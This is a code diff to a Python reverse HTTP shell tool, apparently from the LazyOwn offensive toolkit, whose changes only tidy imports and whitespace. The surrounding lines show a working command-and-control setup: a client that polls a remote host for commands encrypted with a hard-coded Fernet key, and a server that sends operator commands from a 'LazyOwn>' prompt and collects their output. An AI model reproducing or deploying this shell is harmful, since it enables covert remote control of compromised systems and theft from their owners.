@@ -1,10 +1,11 @@
-import sys
-import requests
-import subprocess
-import time
 import base64
+import subprocess
+import sys
+import time
 import zlib
 from http.server import BaseHTTPRequestHandler, HTTPServer
+
+import requests
 from cryptography.fernet import Fernet
 
 FIXED_KEY = b'TGEPpacDlj_czSt_mNwnLvi67K4yHf16795gV8NZ3Pc='
@@ -29,7 +30,7 @@ def reverse_http_shell_client(lhost, rhost, rport):
             if req.status_code != 200:
                 print(f"[!] Authentication failed: {req.status_code}")
                 break
-            
+
             command = decrypt(base64.b64decode(req.text)).decode()
 
             if 'terminate' in command:
@@ -53,7 +54,7 @@ def reverse_http_shell_server(lhost, lport):
                 self.send_response(403)
                 self.end_headers()
                 return
-            
+
             command = input("LazyOwn> ")
             encrypted_command = base64.b64encode(encrypt(command.encode())).decode()
             self.send_response(200)
@@ -66,7 +67,7 @@ def reverse_http_shell_server(lhost, lport):
                 self.send_response(403)
                 self.end_headers()
                 return
-            
+
             self.send_response(200)
             self.end_headers()
             length = int(self.headers['Content-Length'])
@@ -95,18 +96,18 @@ def parse_arguments(args):
 
 if __name__ == "__main__":
     options = parse_arguments(sys.argv)
-    
+
     if options["mode"] == "client":
         if options["--lhost"] and options["--rhost"] and options["--rport"]:
             reverse_http_shell_client(options["--lhost"], options["--rhost"], options["--rport"])
         else:
             print("[!] Missing required arguments for client mode")
-    
+
     elif options["mode"] == "server":
         if options["--lhost"] and options["--lport"]:
             reverse_http_shell_server(options["--lhost"], options["--lport"])
         else:
             print("[!] Missing required arguments for server mode")
-    
+
     else:
         print("[!] Invalid mode. Use 'client' or 'server'")
